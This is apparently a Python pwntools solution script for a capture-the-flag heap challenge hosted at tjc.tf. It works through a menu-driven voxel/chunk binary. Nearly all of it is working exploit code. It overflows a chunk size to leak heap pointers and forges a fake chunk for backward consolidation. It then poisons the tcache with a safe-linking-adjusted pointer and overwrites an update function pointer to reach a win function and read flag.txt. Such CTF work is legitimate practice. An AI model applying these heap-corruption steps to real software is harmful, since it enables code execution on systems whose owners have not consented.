from pwn import *

from Crypto.Util.number import long_to_bytes, bytes_to_long

import math
import time

elf = ELF("./bin/out")

proc = remote("tjc.tf", 31244) #elf.process()
print(proc.recvuntil(b"3.14159\n"))

def delay(func):
	def _delay(*args, **kwargs):
		time.sleep(0.0)
		return func(*args, **kwargs)
	return _delay

blocks = {}

@delay
def alloc(n, name, default = False):
	center_rho = n
	center_phi = (math.pi / 3.1)
	center_theta = 0
	
	rho_stride = 1.0001
	phi_stride = 1 / center_rho
	theta_stride = 1 / (center_rho * math.sin(center_phi))
	
	d_rho = n
	d_phi = phi_stride
	d_theta = theta_stride
	
	rho = center_rho - d_rho / 2
	phi = center_phi - d_phi / 2
	theta = center_theta - d_theta / 2

	voxel_vol = center_rho * center_rho * rho_stride * math.sin(center_phi) * phi_stride * theta_stride
	
	if (not default):
		#print(rho, phi, theta, d_rho, d_phi, d_theta)
		load = "mkchunk\n" + str(rho) + "\n" + str(phi) + "\n" + str(theta) + "\n" + str(d_rho) + "\n" + str(d_phi) + "\n" + str(d_theta)
		proc.sendline(bytes(load, "UTF-8"))
		#proc.recvline() #Dying...
		retted = int(str(proc.recvline().replace(b"New chunk made at idx: ", b"").replace(b"\n", b""))[2:-1])
		blocks[name] = retted
	else:
		load = "mkchunk\n" + str(-1)
		proc.sendline(bytes(load, "UTF-8"))
		#proc.recvline() #Dying...
		retted = int(str(proc.recvline().replace(b"New chunk made at idx: ", b"").replace(b"\n", b""))[2:-1])
		blocks[name] = retted
		
	
	#addr = int(str(proc.recvline().replace(b"\n", b""))[4:-1].zfill(16), 16)
	#print(name, "vert ptr:", hex(addr))
	
	#return addr

@delay
def write(name, pos, val):
	global blocks
	
	idx = blocks[name]

	load = "write\n" + str(idx) + "\n0\n0\n" + str(pos) + "\n" + str(val)
	
	proc.sendline(bytes(load, "UTF-8"))
	
@delay
def read(name, pos):
	global blocks
	
	idx = blocks[name]

	load = "read\n" + str(idx) + "\n0\n0\n" + str(pos)
	
	proc.sendline(bytes(load, "UTF-8"))
	line = proc.recvline()
	#print("Line:", line)
	line = (line.replace(b"Voxel type is: ", b"")).replace(b"\n", b"")
	return int(str(line)[2:-1])

@delay
def dealloc(name):
	
	global blocks
	
	oldidx = blocks[name]
	
	blocks.pop(name)
			
	
	proc.sendline(b"delchunk\n" + bytes(str(oldidx), "UTF-8"))
	#print(proc.recvline())#Dying...
	
	#proc.recvline()

@delay
def info(name):
	global blocks
	
	pos = blocks[name]
	proc.sendline(b"info\n" + bytes(str(pos), "UTF-8"))
	print(proc.recvline())

@delay
def heapChunk():
	proc.sendline(b"heapChunk\n")
	heapi = proc.recvline()

@delay
def unHeapChunk():
	proc.sendline(b"freeChunk\n")
	addr = proc.recvline()

@delay 
def mupdate():
	proc.sendline(b"mupdate\n")
	print(proc.recvline())

def dealloc_all():
	unHeapChunk()
	while blocks:
		dealloc(list(blocks.keys())[0])

def write_bytes(place, pos, byt):
	for i in range(len(byt)):
		write(place, pos + i, byt[i])

def read_bytes(place, pos, num):
	bout = b""
	for i in range(pos, pos + num):
		bout += long_to_bytes(read(place, i))
	return bout
	
win_addr = int(str(proc.recvline()[:-1])[2:-1])
char_arr = int(str(proc.recvline()[:-1])[2:-1])
print("Win, char:", hex(win_addr), hex(char_arr))

verts_offset = 88
noisegen_offset = 80
updater_offset = 72

init_size = 0x78
# attack chunk
# We will overwrite to get heap and stack leek
# We will also use this to redirect ->update()
alloc(init_size, "a")

# Weak chunk; will be clobbered
alloc(0x10, "b")

# We will read from this chunk the heap and stack leek
alloc(init_size, "reader")

# SphereChunk size + 17
attack_block_size = 0x70 + 17

# Overflow b size FROM 0x10 to 0x71
write("a", init_size, attack_block_size)

# Free b
dealloc("b")

# new chunk should overlap w/ reader
# print(attack_block_size - 17)

heapChunk()
#alloc(attack_block_size - 17, "overlapped")

bstr = read_bytes("reader", verts_offset - 0x20, 8)

# To reverse endianness
n_verts_addr = bytes_to_long(bstr[::-1])
print("N_verts at", hex(n_verts_addr))

bstr = read_bytes("reader", noisegen_offset - 0x20, 8)

#dealloc_all()

# To reverse endianness
noisegen_addr = bytes_to_long(bstr[::-1])
print("noisegen_addr at", hex(noisegen_addr))

alloc(0x18, "idr2")

you_addr = 32 + n_verts_addr

alloc(0x28, "idr1")
me_addr = 64 + n_verts_addr

alloc(0x18, "you2")
alloc(0x28, "me2")

alloc(0x38, "they")
they_addr = 192 + n_verts_addr

#indirection level 1
idr_l2 = you_addr

idr_l1 = me_addr

idr_l0 = win_addr

write_bytes("reader", updater_offset - 0x20, p64(idr_l2))
write_bytes("idr2", 0, p64(idr_l0))
#write_bytes("idr1", 0, p64(idr_l0))


alloc(0x38, "they2")
alloc(0x38, "they3")

# HOE

target_addr = char_arr & (~0xff)
print("Target_addr:", hex(target_addr))



#dealloc("you2")
#dealloc("me2")

known_a_chnk_addr = alloc(0x38, "hoe_a")

#info("hoe_a")

# empirically, the fake chnk is 384 bytes past the n_verts_addr 
a_addr = 384 + n_verts_addr
#print(known_fake_chnk_addr - n_verts_addr)
#assert known_a_chnk_addr == a_addr

alloc(0x28, "hoe_b")

known_c_addr = alloc(0xf8, "hoe_c")

#attack c size ptr 
write("hoe_b", 0x28, 0)

c_addr = 496 + n_verts_addr
#print(known_c_addr - n_verts_addr)
#assert known_c_addr == c_addr 

fake_size = 0xffff_ffff_ffff_ffff & (c_addr - 16 - a_addr)
print("Fake size:", hex(fake_size))

fake_chunk = p64(0) + p64(fake_size) + p64(a_addr) + p64(a_addr)
# Set fake chunk of a certain size, set prev_size of b to same value
print("Fake chunk:", " | ".join([fake_chunk[i:i+8].hex() for i in range(0, len(fake_chunk), 8)]))
write_bytes("hoe_a", 0, fake_chunk)

bstr = b""
for i in range(8):
	bstr += long_to_bytes(read("hoe_a", i + 16))
print("A-addr in mem", hex(bytes_to_long(bstr[::-1])))

assert len(fake_chunk) < 0x38

write_bytes("hoe_b", 0x28 - 8, p64(fake_size))

#tcache poison
for i in range(7):
	alloc(0xf8, str(i) + "_tcache_poison")

for i in range(7):
	dealloc(str(i) + "_tcache_poison")

# dealloc c, consolidate w/ b
dealloc("hoe_c")

#fake chunk size should be diff now...
bstr = b""
for i in range(8):
	bstr += long_to_bytes(read("hoe_a", i + 8))
print("A-size after C free in mem", hex(bytes_to_long(bstr[::-1])))

known_d_addr = alloc(0x158, "d")

alloc(0x28, "pad")
dealloc("pad")

write("hoe_a", 0x38, 0x31)

dealloc("hoe_b")

d_addr = 400 + n_verts_addr

#assert known_d_addr == d_addr

word = p64(target_addr ^ ((d_addr + 0x30) >> 12))

write_bytes("d", 0x30, word)

alloc(0x28, "garbo")

alloc(0x28, "cow")

write_bytes("cow", 0, b"flag.txt")
print("Set and now spike it!")
mupdate()
